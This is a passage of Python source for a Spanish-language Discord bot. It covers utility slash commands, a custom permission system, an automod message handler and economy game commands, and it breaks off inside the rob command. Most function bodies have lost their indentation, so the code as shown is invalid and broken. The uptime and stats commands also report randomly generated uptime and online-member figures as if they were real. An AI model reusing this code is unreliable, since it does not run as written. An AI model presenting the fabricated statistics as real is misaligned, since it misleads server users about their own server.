@discord.app_commands.describe(text="Texto a traducir", target_lang="Idioma objetivo")
async def translate_command(interaction: discord.Interaction, text: str, target_lang: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Simulación de traducción
translations = {
  "english": f"[EN] {text} (translated)",
  "spanish": f"[ES] {text} (traducido)",
  "french": f"[FR] {text} (traduit)",
  "german": f"[DE] {text} (übersetzt)",
  "italian": f"[IT] {text} (tradotto)",
  "portuguese": f"[PT] {text} (traduzido)"
}

target = target_lang.lower()
if target in translations:
  result = translations[target]
else:
  result = f"[{target_lang.upper()}] {text} (simulated translation)"

embed = discord.Embed(
  title="🌐 Traductor",
  color=discord.Color.blue())
embed.add_field(name="📝 Original", value=text, inline=False)
embed.add_field(name="🔄 Traducido", value=result, inline=False)
embed.add_field(name="🎯 Idioma", value=target_lang.title(), inline=True)
embed.set_footer(text="⚠️ Traducción simulada - No real")

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="joke", description="Contar un chiste aleatorio")
async def joke_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

jokes = [
  "¿Por qué los programadores prefieren el modo oscuro? Porque la luz atrae a los bugs! 🐛",
  "¿Cómo se llama un boomerang que no vuelve? Un palo. 🪃",
  "¿Por qué los pájaros vuelan hacia el sur en invierno? Porque es muy lejos para caminar. 🐦",
  "¿Qué le dice un taco a otro taco? ¿Quieres que salgamos esta noche? 🌮",
  "¿Por qué los desarrolladores odian la naturaleza? Tiene demasiados bugs. 🌿",
  "¿Qué hace una abeja en el gimnasio? ¡Zum-ba! 🐝"
]

joke = random.choice(jokes)

embed = discord.Embed(
  title="😂 Chiste del Día",
  description=joke,
  color=discord.Color.orange())

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="color", description="Generar un color aleatorio")
async def color_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Generar color aleatorio
color_int = random.randint(0, 16777215)  # 0xFFFFFF
hex_color = f"#{color_int:06x}".upper()

# Valores RGB
r = (color_int >> 16) & 255
g = (color_int >> 8) & 255  
b = color_int & 255

embed = discord.Embed(
  title="🎨 Color Aleatorio",
  color=discord.Color(color_int))

embed.add_field(name="🔢 HEX", value=f"`{hex_color}`", inline=True)
embed.add_field(name="🌈 RGB", value=f"`({r}, {g}, {b})`", inline=True)
embed.add_field(name="🎯 Decimal", value=f"`{color_int}`", inline=True)

# Cuadrado de color simulado
embed.add_field(name="🎨 Vista Previa", 
             value="El color se muestra en el borde de este embed", 
             inline=False)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="base64", description="Codificar/decodificar texto en Base64")
@discord.app_commands.describe(action="encode o decode", text="Texto a procesar")
async def base64_command(interaction: discord.Interaction, action: str, text: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

try:
  import base64

  if action.lower() == "encode":
      encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')

      embed = discord.Embed(
          title="🔐 Base64 Encoder",
          color=discord.Color.green())
      embed.add_field(name="📝 Original", value=f"```{text}```", inline=False)
      embed.add_field(name="🔒 Codificado", value=f"```{encoded}```", inline=False)

  elif action.lower() == "decode":
      try:
          decoded = base64.b64decode(text.encode('utf-8')).decode('utf-8')

          embed = discord.Embed(
              title="🔓 Base64 Decoder",
              color=discord.Color.blue())
          embed.add_field(name="🔒 Codificado", value=f"```{text}```", inline=False)
          embed.add_field(name="📝 Decodificado", value=f"```{decoded}```", inline=False)
      except:
          await interaction.response.send_message(
              "❌ El texto no es válido en Base64.", ephemeral=True)
          return
  else:
      await interaction.response.send_message(
          "❌ Acción debe ser 'encode' o 'decode'.", ephemeral=True)
      return

  await interaction.response.send_message(embed=embed)

except Exception as e:
  await interaction.response.send_message(
      f"❌ Error procesando Base64: {str(e)}", ephemeral=True)


@bot.tree.command(name="uptime", description="Ver tiempo de actividad del bot")
async def uptime_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

# Simular tiempo de actividad
days = random.randint(0, 30)
hours = random.randint(0, 23)
minutes = random.randint(0, 59)

embed = discord.Embed(
  title="⏱️ Tiempo de Actividad",
  description=f"**{days}** días, **{hours}** horas, **{minutes}** minutos",
  color=discord.Color.green())

embed.add_field(name="📊 Estado", value="🟢 En línea", inline=True)
embed.add_field(name="🌐 Servidores", value=f"{len(bot.guilds)}", inline=True)
embed.add_field(name="👥 Usuarios", value=f"~{len(bot.users)}", inline=True)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="choose", description="Elegir entre opciones")
@discord.app_commands.describe(options="Opciones separadas por comas")
async def choose_command(interaction: discord.Interaction, options: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

choices = [choice.strip() for choice in options.split(',') if choice.strip()]

if len(choices) < 2:
  await interaction.response.send_message(
      "❌ Necesitas al menos 2 opciones separadas por comas.", ephemeral=True)
  return

chosen = random.choice(choices)

embed = discord.Embed(
  title="🎯 Elección Aleatoria",
  description=f"**He elegido:** {chosen}",
  color=discord.Color.gold())

embed.add_field(name="📝 Opciones", 
             value="\n".join([f"• {choice}" for choice in choices]), 
             inline=False)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="ascii", description="Convertir texto a arte ASCII")
@discord.app_commands.describe(text="Texto a convertir (máximo 10 caracteres)")
async def ascii_command(interaction: discord.Interaction, text: str):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

if len(text) > 10:
  await interaction.response.send_message(
      "❌ Máximo 10 caracteres.", ephemeral=True)
  return

# ASCII art simple simulado
ascii_art = f"""
```
██╗  {text.upper()}  ██╗
████╗   ███████   ████╗
╚═══╝   ╚══════╝  ╚═══╝
```"""

embed = discord.Embed(
  title="🎨 Arte ASCII",
  description=ascii_art,
  color=discord.Color.blue())
embed.set_footer(text="⚠️ Arte ASCII simulado")

await interaction.response.send_message(embed=embed)


# ================================
# SISTEMA DE PERMISOS PERSONALIZADO Y COMANDOS DE MODERACIÓN
# ================================

# Sistema de permisos personalizado
custom_permissions_file = 'custom_permissions.json'
if os.path.exists(custom_permissions_file):
  with open(custom_permissions_file, 'r') as f:
      custom_permissions = json.load(f)
else:
  custom_permissions = {}

def save_custom_permissions():
  with open(custom_permissions_file, 'w') as f:
      json.dump(custom_permissions, f)

def get_user_permissions(user_id, guild_id):
"""Obtener permisos personalizados de un usuario"""
user_id = str(user_id)
guild_id = str(guild_id)

if guild_id not in custom_permissions:
    custom_permissions[guild_id] = {}

guild_perms = custom_permissions[guild_id]
return guild_perms.get(user_id, {"can_execute_commands": False})

def set_user_permissions(user_id, guild_id, permissions):
"""Establecer permisos personalizados para un usuario"""
user_id = str(user_id)
guild_id = str(guild_id)

if guild_id not in custom_permissions:
    custom_permissions[guild_id] = {}

custom_permissions[guild_id][user_id] = permissions
save_custom_permissions()

def get_role_permissions(role_id, guild_id):
"""Obtener permisos personalizados de un rol"""
role_id = str(role_id)
guild_id = str(guild_id)

if guild_id not in custom_permissions:
    custom_permissions[guild_id] = {}

guild_perms = custom_permissions[guild_id]
role_key = f"role_{role_id}"
return guild_perms.get(role_key, {"can_execute_commands": False})

def set_role_permissions(role_id, guild_id, permissions):
"""Establecer permisos personalizados para un rol"""
role_id = str(role_id)
guild_id = str(guild_id)

if guild_id not in custom_permissions:
    custom_permissions[guild_id] = {}

role_key = f"role_{role_id}"
custom_permissions[guild_id][role_key] = permissions
save_custom_permissions()

def user_has_permission(user, guild, permission_type):
"""Verificar si un usuario tiene un permiso específico"""
if not guild:
    return False

# El owner del servidor siempre tiene todos los permisos
if user.id == guild.owner_id:
    return True

# Verificar permisos de usuario directo
user_perms = get_user_permissions(user.id, guild.id)
if user_perms.get(permission_type, False):
    return True

# Verificar permisos de roles
for role in user.roles:
    role_perms = get_role_permissions(role.id, guild.id)
    if role_perms.get(permission_type, False):
        return True

return False

@bot.tree.command(name="say", description="Hacer que el bot envíe un mensaje")
@discord.app_commands.describe(
message="Mensaje que el bot enviará",
channel="Canal donde enviar el mensaje (opcional)"
)
async def say_command(interaction: discord.Interaction, message: str, channel: discord.TextChannel = None):
if economy_only_mode:
    await interaction.response.send_message(
        "❌ En modo economía, solo se permiten comandos con prefijo `.`",
        ephemeral=True)
    return

# Verificar si es el owner del servidor o tiene permisos personalizados
if not (interaction.user.id == interaction.guild.owner_id or 
        user_has_permission(interaction.user, interaction.guild, "can_execute_commands")):
    await interaction.response.send_message(
        "❌ Solo el propietario del servidor o usuarios con permisos especiales pueden usar este comando.",
        ephemeral=True)
    return

target_channel = channel or interaction.channel

# Verificar permisos del bot en el canal objetivo
if not target_channel.permissions_for(interaction.guild.me).send_messages:
    await interaction.response.send_message(
        f"❌ No tengo permisos para enviar mensajes en {target_channel.mention}",
        ephemeral=True)
    return

try:
    # Enviar el mensaje
    await target_channel.send(message)

    # Confirmar al usuario
    if channel and channel != interaction.channel:
        await interaction.response.send_message(
            f"✅ Mensaje enviado en {target_channel.mention}",
            ephemeral=True)
    else:
        await interaction.response.send_message(
            "✅ Mensaje enviado",
            ephemeral=True)

    # Log del comando
    print(f"Comando /say usado por {interaction.user.name} en {interaction.guild.name}")

except Exception as e:
    await interaction.response.send_message(
        f"❌ Error al enviar mensaje: {str(e)}",
        ephemeral=True)

@bot.tree.command(name="giveperms", description="Otorgar permisos especiales a usuarios o roles")
@discord.app_commands.describe(
target="Usuario o rol al que otorgar permisos",
action="Tipo de acción (can_execute_commands)",
value="true o false"
)
async def giveperms_command(interaction: discord.Interaction, 
                       target: str, 
                       action: str, 
                       value: bool):
if economy_only_mode:
    await interaction.response.send_message(
        "❌ En modo economía, solo se permiten comandos con prefijo `.`",
        ephemeral=True)
    return

# Solo el owner del servidor puede usar este comando
if interaction.user.id != interaction.guild.owner_id:
    await interaction.response.send_message(
        "❌ Solo el propietario del servidor puede usar este comando.",
        ephemeral=True)
    return

# Validar acción
valid_actions = ["can_execute_commands"]
if action not in valid_actions:
    await interaction.response.send_message(
        f"❌ Acción inválida. Acciones disponibles: {', '.join(valid_actions)}",
        ephemeral=True)
    return

# Procesar el target (usuario o rol)
target_user = None
target_role = None

# Intentar convertir a mención de usuario
if target.startswith('<@') and target.endswith('>'):
    user_id = target.strip('<@!>')
    try:
        target_user = interaction.guild.get_member(int(user_id))
    except:
        pass

# Intentar convertir a mención de rol
elif target.startswith('<@&') and target.endswith('>'):
    role_id = target.strip('<@&>')
    try:
        target_role = interaction.guild.get_role(int(role_id))
    except:
        pass

# Buscar por nombre si no es mención
if not target_user and not target_role:
    # Buscar usuario por nombre
    target_user = discord.utils.get(interaction.guild.members, name=target)
    if not target_user:
        target_user = discord.utils.get(interaction.guild.members, display_name=target)

    # Buscar rol por nombre si no se encontró usuario
    if not target_user:
        target_role = discord.utils.get(interaction.guild.roles, name=target)

if not target_user and not target_role:
    await interaction.response.send_message(
        "❌ No se encontró el usuario o rol especificado. Usa menciones (@usuario o @rol) o nombres exactos.",
        ephemeral=True)
    return

# Aplicar permisos
try:
    if target_user:
        # Obtener permisos actuales del usuario
        current_perms = get_user_permissions(target_user.id, interaction.guild.id)
        current_perms[action] = value
        set_user_permissions(target_user.id, interaction.guild.id, current_perms)

        embed = discord.Embed(
            title="✅ Permisos Actualizados",
            description=f"Permisos modificados para **{target_user.display_name}**",
            color=discord.Color.green()
        )
        embed.add_field(name="👤 Usuario", value=target_user.mention, inline=True)
        embed.add_field(name="⚙️ Acción", value=action, inline=True)
        embed.add_field(name="✅ Valor", value="Permitido" if value else "Denegado", inline=True)

    elif target_role:
        # Obtener permisos actuales del rol
        current_perms = get_role_permissions(target_role.id, interaction.guild.id)
        current_perms[action] = value
        set_role_permissions(target_role.id, interaction.guild.id, current_perms)

        embed = discord.Embed(
            title="✅ Permisos Actualizados",
            description=f"Permisos modificados para el rol **{target_role.name}**",
            color=discord.Color.green()
        )
        embed.add_field(name="🏷️ Rol", value=target_role.mention, inline=True)
        embed.add_field(name="⚙️ Acción", value=action, inline=True)
        embed.add_field(name="✅ Valor", value="Permitido" if value else "Denegado", inline=True)

    embed.set_footer(text=f"Comando ejecutado por {interaction.user.display_name}")
    await interaction.response.send_message(embed=embed)

    # Log del comando
    target_name = target_user.display_name if target_user else target_role.name
    target_type = "usuario" if target_user else "rol"
    print(f"Permisos modificados por {interaction.user.name}: {target_name} ({target_type}) - {action}: {value}")

except Exception as e:
    await interaction.response.send_message(
        f"❌ Error al modificar permisos: {str(e)}",
        ephemeral=True)

@bot.tree.command(name="viewperms", description="Ver permisos especiales de usuarios y roles")
@discord.app_commands.describe(target="Usuario o rol del que ver permisos (opcional)")
async def viewperms_command(interaction: discord.Interaction, target: str = None):
if economy_only_mode:
    await interaction.response.send_message(
        "❌ En modo economía, solo se permiten comandos con prefijo `.`",
        ephemeral=True)
    return

# Solo el owner del servidor puede ver todos los permisos
if interaction.user.id != interaction.guild.owner_id:
    await interaction.response.send_message(
        "❌ Solo el propietario del servidor puede ver los permisos.",
        ephemeral=True)
    return

guild_id = str(interaction.guild.id)

if guild_id not in custom_permissions:
    await interaction.response.send_message(
        "❌ No hay permisos personalizados configurados en este servidor.",
        ephemeral=True)
    return

guild_perms = custom_permissions[guild_id]

if target:
    # Mostrar permisos de un target específico
    target_user = None
    target_role = None

    # Buscar usuario o rol
    if target.startswith('<@') and target.endswith('>'):
        user_id = target.strip('<@!>')
        try:
            target_user = interaction.guild.get_member(int(user_id))
        except:
            pass
    elif target.startswith('<@&') and target.endswith('>'):
        role_id = target.strip('<@&>')
        try:
            target_role = interaction.guild.get_role(int(role_id))
        except:
            pass
    else:
        target_user = discord.utils.get(interaction.guild.members, name=target)
        if not target_user:
            target_role = discord.utils.get(interaction.guild.roles, name=target)

    if not target_user and not target_role:
        await interaction.response.send_message(
            "❌ No se encontró el usuario o rol especificado.",
            ephemeral=True)
        return

    if target_user:
        perms = get_user_permissions(target_user.id, interaction.guild.id)
        embed = discord.Embed(
            title=f"🔍 Permisos de {target_user.display_name}",
            color=discord.Color.blue()
        )
        embed.set_thumbnail(url=target_user.display_avatar.url)
    else:
        perms = get_role_permissions(target_role.id, interaction.guild.id)
        embed = discord.Embed(
            title=f"🔍 Permisos del rol {target_role.name}",
            color=target_role.color if target_role.color != discord.Color.default() else discord.Color.blue()
        )

    perms_text = ""
    for perm, value in perms.items():
        status = "✅ Permitido" if value else "❌ Denegado"
        perms_text += f"**{perm}:** {status}\n"

    if not perms_text:
        perms_text = "Sin permisos especiales configurados"

    embed.add_field(name="⚙️ Permisos", value=perms_text, inline=False)

else:
    # Mostrar todos los permisos del servidor
    embed = discord.Embed(
        title=f"🔍 Permisos Especiales - {interaction.guild.name}",
        color=discord.Color.blue()
    )

    users_with_perms = []
    roles_with_perms = []

    for key, perms in guild_perms.items():
        if key.startswith("role_"):
            role_id = key.replace("role_", "")
            role = interaction.guild.get_role(int(role_id))
            if role:
                roles_with_perms.append((role.name, perms))
        else:
            user = interaction.guild.get_member(int(key))
            if user:
                users_with_perms.append((user.display_name, perms))

    if users_with_perms:
        users_text = ""
        for name, perms in users_with_perms:
            active_perms = [perm for perm, value in perms.items() if value]
            if active_perms:
                users_text += f"**{name}:** {', '.join(active_perms)}\n"

        if users_text:
            embed.add_field(name="👥 Usuarios", value=users_text, inline=False)

    if roles_with_perms:
        roles_text = ""
        for name, perms in roles_with_perms:
            active_perms = [perm for perm, value in perms.items() if value]
            if active_perms:
                roles_text += f"**{name}:** {', '.join(active_perms)}\n"

        if roles_text:
            embed.add_field(name="🏷️ Roles", value=roles_text, inline=False)

    if not users_with_perms and not roles_with_perms:
        embed.description = "No hay permisos especiales configurados."

await interaction.response.send_message(embed=embed)

# ================================
# COMANDOS DE INFORMACIÓN Y ESTADÍSTICAS
# ================================

@bot.tree.command(name="stats", description="Estadísticas del servidor")
async def stats_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

guild = interaction.guild
if not guild:
  await interaction.response.send_message(
      "❌ Este comando solo funciona en servidores.", ephemeral=True)
  return

# Contar tipos de canales
text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
categories = len([c for c in guild.channels if isinstance(c, discord.CategoryChannel)])

# Contar miembros online (simulado)
online_members = random.randint(1, min(50, guild.member_count or 10))

embed = discord.Embed(
  title=f"📊 Estadísticas de {guild.name}",
  color=discord.Color.blue())

embed.add_field(name="👥 Miembros", value=guild.member_count or "No disponible", inline=True)
embed.add_field(name="🟢 En línea", value=online_members, inline=True)
embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)

embed.add_field(name="📝 Canales de texto", value=text_channels, inline=True)
embed.add_field(name="🔊 Canales de voz", value=voice_channels, inline=True)
embed.add_field(name="📁 Categorías", value=categories, inline=True)

embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)
embed.add_field(name="🎉 Boosts", value=guild.premium_subscription_count or 0, inline=True)
embed.add_field(name="⭐ Nivel boost", value=f"Nivel {guild.premium_tier}", inline=True)

if guild.icon:
  embed.set_thumbnail(url=guild.icon.url)

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="roles", description="Lista todos los roles del servidor")
async def roles_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

guild = interaction.guild
if not guild:
  await interaction.response.send_message(
      "❌ Este comando solo funciona en servidores.", ephemeral=True)
  return

roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)

embed = discord.Embed(
  title=f"🏷️ Roles en {guild.name}",
  description=f"Total: **{len(roles)}** roles",
  color=discord.Color.blue())

role_list = ""
for i, role in enumerate(roles[:20]):  # Mostrar máximo 20
  if role.name != "@everyone":
      member_count = len(role.members)
      role_list += f"**{role.name}** - {member_count} miembro{'s' if member_count != 1 else ''}\n"

if role_list:
  embed.add_field(name="📋 Lista de Roles", value=role_list, inline=False)

if len(roles) > 20:
  embed.set_footer(text=f"Mostrando 20 de {len(roles)} roles")

await interaction.response.send_message(embed=embed)


@bot.tree.command(name="channels", description="Lista todos los canales del servidor")
async def channels_command(interaction: discord.Interaction):
if economy_only_mode:
  await interaction.response.send_message(
      "❌ En modo economía, solo se permiten comandos con prefijo `.`",
      ephemeral=True)
  return

guild = interaction.guild
if not guild:
  await interaction.response.send_message(
      "❌ Este comando solo funciona en servidores.", ephemeral=True)
  return

text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
voice_channels = [c for c in guild.channels if isinstance(c, discord.VoiceChannel)]

embed = discord.Embed(
  title=f"📋 Canales en {guild.name}",
  color=discord.Color.blue())

if text_channels:
  text_list = "\n".join([f"📝 {c.name}" for c in text_channels[:15]])
  embed.add_field(name="💬 Canales de Texto", value=text_list, inline=False)

if voice_channels:
  voice_list = "\n".join([f"🔊 {c.name}" for c in voice_channels[:15]])
  embed.add_field(name="🎤 Canales de Voz", value=voice_list, inline=False)

total_channels = len(guild.channels)
if total_channels > 30:
  embed.set_footer(text=f"Mostrando algunos de {total_channels} canales totales")

await interaction.response.send_message(embed=embed)


# ================================
# MODIFICAR EVENT ON_MESSAGE PARA INTEGRAR SISTEMAS
# ================================


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None

    # Sistema de automod
    if guild_id and automod_enabled.get(guild_id, False):
        # Filtro de palabras
        content_lower = message.content.lower()
        if any(word in content_lower for word in banned_words):
            try:
                await message.delete()

                # Añadir advertencia
                user_id = message.author.id
                if user_id not in warning_counts:
                    warning_counts[user_id] = 0
                warning_counts[user_id] += 1

                warnings = warning_counts[user_id]
                threshold = automod_settings[guild_id]['warn_threshold']

                embed = discord.Embed(
                    title="🚫 Mensaje Eliminado",
                    description=
                    f"{message.author.mention} tu mensaje contenía palabras prohibidas.",
                    color=discord.Color.red())
                embed.add_field(name="⚠️ Advertencias",
                                value=f"{warnings}/{threshold}",
                                inline=True)

                if warnings >= threshold:
                    try:
                        await message.author.timeout(
                            datetime.timedelta(minutes=10),
                            reason="Demasiadas advertencias")
                        embed.add_field(name="🔇 Castigo",
                                        value="Silenciado por 10 minutos",
                                        inline=True)
                        warning_counts[user_id] = 0
                    except:
                        pass

                await message.channel.send(embed=embed, delete_after=10)
            except:
                pass

    # Sistema de niveles (XP por mensaje)
    if guild_id:
        await process_level_system(message)

    # CRÍTICO: Procesar comandos de economía y otros
    await bot.process_commands(message)


# ================================
# COMANDOS DE ECONOMÍA CON PREFIJO .
# ================================

@bot.command(name='balance')
async def balance_command(ctx):
"""Ver tu balance de dinero"""
user_data = get_balance(ctx.author.id)
total = user_data['wallet'] + user_data['bank']

embed = discord.Embed(title="💰 Tu Balance", color=discord.Color.green())
embed.add_field(name="👛 Billetera", value=f"${user_data['wallet']:,}", inline=True)
embed.add_field(name="🏦 Banco", value=f"${user_data['bank']:,}", inline=True)
embed.add_field(name="💎 Total", value=f"${total:,}", inline=True)
embed.set_footer(text=f"Balance de {ctx.author.display_name}")

await ctx.send(embed=embed)

@bot.command(name='work')
async def work_command(ctx):
"""Trabajar para ganar dinero"""
if not can_use_cooldown(ctx.author.id, 'work', 3600):  # 1 hora
  remaining = get_cooldown_remaining(ctx.author.id, 'work', 3600)
  minutes = int(remaining // 60)
  seconds = int(remaining % 60)
  await ctx.send(f"⏰ Debes esperar **{minutes}m {seconds}s** antes de trabajar de nuevo.")
  return

jobs = [
  ("👨‍💻 Programador", 500, 1200),
  ("🏪 Cajero", 300, 800),
  ("🚚 Conductor", 400, 900),
  ("👨‍🍳 Chef", 350, 750),
  ("📚 Bibliotecario", 250, 600),
  ("🧹 Conserje", 200, 500),
  ("📦 Repartidor", 300, 700)
]

job_name, min_pay, max_pay = random.choice(jobs)
earnings = random.randint(min_pay, max_pay)

update_balance(ctx.author.id, earnings, 0)

embed = discord.Embed(title="💼 Trabajo Completado", color=discord.Color.green())
embed.add_field(name="👷 Trabajo", value=job_name, inline=True)
embed.add_field(name="💰 Ganaste", value=f"${earnings:,}", inline=True)
embed.set_footer(text="¡Buen trabajo! Vuelve en 1 hora.")

await ctx.send(embed=embed)

@bot.command(name='daily')
async def daily_command(ctx):
"""Recompensa diaria"""
if not can_use_cooldown(ctx.author.id, 'daily', 86400):  # 24 horas
  remaining = get_cooldown_remaining(ctx.author.id, 'daily', 86400)
  hours = int(remaining // 3600)
  minutes = int((remaining % 3600) // 60)
  await ctx.send(f"⏰ Ya recogiste tu recompensa diaria. Vuelve en **{hours}h {minutes}m**.")
  return

daily_amount = random.randint(800, 1500)
update_balance(ctx.author.id, daily_amount, 0)

embed = discord.Embed(title="🎁 Recompensa Diaria", color=discord.Color.gold())
embed.add_field(name="💰 Ganaste", value=f"${daily_amount:,}", inline=True)
embed.add_field(name="⏰ Próxima", value="En 24 horas", inline=True)
embed.set_footer(text="¡Vuelve mañana para más!")

await ctx.send(embed=embed)

@bot.command(name='pay')
async def pay_command(ctx, member: discord.Member = None, amount: int = None):
"""Enviar dinero a otro usuario"""
if not member or not amount:
  await ctx.send("❌ Uso: `.pay @usuario cantidad`")
  return

if member.bot:
  await ctx.send("❌ No puedes enviar dinero a un bot.")
  return

if member.id == ctx.author.id:
  await ctx.send("❌ No puedes enviarte dinero a ti mismo.")
  return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

sender_balance = get_balance(ctx.author.id)
if sender_balance['wallet'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${sender_balance['wallet']:,}")
  return

# Transferir dinero
update_balance(ctx.author.id, -amount, 0)
update_balance(member.id, amount, 0)

embed = discord.Embed(title="💸 Transferencia Exitosa", color=discord.Color.green())
embed.add_field(name="👤 Enviaste", value=f"${amount:,} a {member.mention}", inline=False)
embed.set_footer(text="¡Transferencia completada!")

await ctx.send(embed=embed)

@bot.command(name='deposit')
async def deposit_command(ctx, amount=None):
"""Depositar dinero en el banco"""
if not amount:
  await ctx.send("❌ Uso: `.deposit cantidad` o `.deposit all`")
  return

user_balance = get_balance(ctx.author.id)

if amount.lower() == 'all':
  amount = user_balance['wallet']
else:
  try:
      amount = int(amount)
  except ValueError:
      await ctx.send("❌ Cantidad inválida.")
      return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

if user_balance['wallet'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
  return

update_balance(ctx.author.id, -amount, amount)

embed = discord.Embed(title="🏦 Depósito Exitoso", color=discord.Color.blue())
embed.add_field(name="💰 Depositaste", value=f"${amount:,}", inline=True)
embed.add_field(name="🏦 Nuevo balance bancario", value=f"${user_balance['bank'] + amount:,}", inline=True)

await ctx.send(embed=embed)

@bot.command(name='withdraw')
async def withdraw_command(ctx, amount=None):
"""Retirar dinero del banco"""
if not amount:
  await ctx.send("❌ Uso: `.withdraw cantidad` o `.withdraw all`")
  return

user_balance = get_balance(ctx.author.id)

if amount.lower() == 'all':
  amount = user_balance['bank']
else:
  try:
      amount = int(amount)
  except ValueError:
      await ctx.send("❌ Cantidad inválida.")
      return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

if user_balance['bank'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero en el banco. Tienes ${user_balance['bank']:,}")
  return

update_balance(ctx.author.id, amount, -amount)

embed = discord.Embed(title="🏦 Retiro Exitoso", color=discord.Color.blue())
embed.add_field(name="💰 Retiraste", value=f"${amount:,}", inline=True)
embed.add_field(name="👛 Nuevo balance de billetera", value=f"${user_balance['wallet'] + amount:,}", inline=True)

await ctx.send(embed=embed)

@bot.command(name='beg')
async def beg_command(ctx):
"""Mendigar por dinero"""
if not can_use_cooldown(ctx.author.id, 'beg', 300):  # 5 minutos
  remaining = get_cooldown_remaining(ctx.author.id, 'beg', 300)
  minutes = int(remaining // 60)
  seconds = int(remaining % 60)
  await ctx.send(f"⏰ Debes esperar **{minutes}m {seconds}s** antes de mendigar de nuevo.")
  return

success_chance = random.random()

if success_chance > 0.3:  # 70% de éxito
  amount = random.randint(50, 200)
  update_balance(ctx.author.id, amount, 0)

  messages = [
      f"🪙 Un extraño te dio ${amount}!",
      f"💝 Alguien se compadeció de ti y te dio ${amount}!",
      f"🙏 Una persona bondadosa te donó ${amount}!",
      f"✨ Encontraste ${amount} en el suelo!"
  ]

  await ctx.send(random.choice(messages))
else:
  messages = [
      "😔 Nadie te dio dinero esta vez...",
      "🚫 La gente te ignoró.",
      "😅 No tuviste suerte esta vez."
  ]

  await ctx.send(random.choice(messages))

@bot.command(name='crime')
async def crime_command(ctx):
"""Cometer crímenes por dinero (riesgoso)"""
if not can_use_cooldown(ctx.author.id, 'crime', 1800):  # 30 minutos
  remaining = get_cooldown_remaining(ctx.author.id, 'crime', 1800)
  minutes = int(remaining // 60)
  seconds = int(remaining % 60)
  await ctx.send(f"⏰ Debes esperar **{minutes}m {seconds}s** antes de cometer otro crimen.")
  return

crimes = [
  ("🏪 Robar una tienda", 200, 800),
  ("🚗 Robar un auto", 500, 1200),
  ("💻 Hackear un banco", 800, 2000),
  ("💎 Robar joyería", 600, 1500),
  ("🏛️ Robar un museo", 1000, 2500)
]

crime_name, min_reward, max_reward = random.choice(crimes)
success_chance = random.random()

if success_chance > 0.4:  # 60% de éxito
  reward = random.randint(min_reward, max_reward)
  update_balance(ctx.author.id, reward, 0)

  embed = discord.Embed(title="🎭 Crimen Exitoso", color=discord.Color.green())
  embed.add_field(name="🔫 Crimen", value=crime_name, inline=True)
  embed.add_field(name="💰 Ganaste", value=f"${reward:,}", inline=True)
  embed.set_footer(text="¡Escapaste sin ser atrapado!")

  await ctx.send(embed=embed)
else:
  fine = random.randint(100, 500)
  user_balance = get_balance(ctx.author.id)

  if user_balance['wallet'] >= fine:
      update_balance(ctx.author.id, -fine, 0)

  embed = discord.Embed(title="🚔 Te Atraparon", color=discord.Color.red())
  embed.add_field(name="🔫 Crimen", value=crime_name, inline=True)
  embed.add_field(name="💸 Multa", value=f"${fine:,}", inline=True)
  embed.set_footer(text="¡La policía te atrapó!")

  await ctx.send(embed=embed)

@bot.command(name='rob')
async def rob_command(ctx, member: discord.Member = None):
"""Intentar robar a otro usuario"""
if not member:
  await ctx.send("❌ Uso: `.rob @usuario`")
  return

if member.bot:
  await ctx.send("❌ No puedes robar a un bot.")
  return

if member.id == ctx.author.id:
  await ctx.send("❌ No puedes robarte a ti mismo.")
  return

if not can_use_cooldown(ctx.author.id, 'rob', 3600):  # 1 hora
  remaining = get_cooldown_remaining(ctx.author.id, 'rob', 3600)
  minutes = int(remaining // 60)
  await ctx.send(f"⏰ Debes esperar **{minutes}m** antes de robar de nuevo.")
  return

target_balance = get_balance(member.id)
if target_balance['wallet'] < 500:
  await ctx.send(f"❌ {member.mention} no tiene suficiente dinero para robar (mínimo $500).")
  return

success_chance = random.random()

if success_chance > 0.5:  # 50% de éxito
  stolen_amount = random.randint(100, min(target_balance['wallet'] // 3, 1000))

  update_balance(member.id, -stolen_amount, 0)
  update_balance(ctx.author.id, stolen_amount, 0)

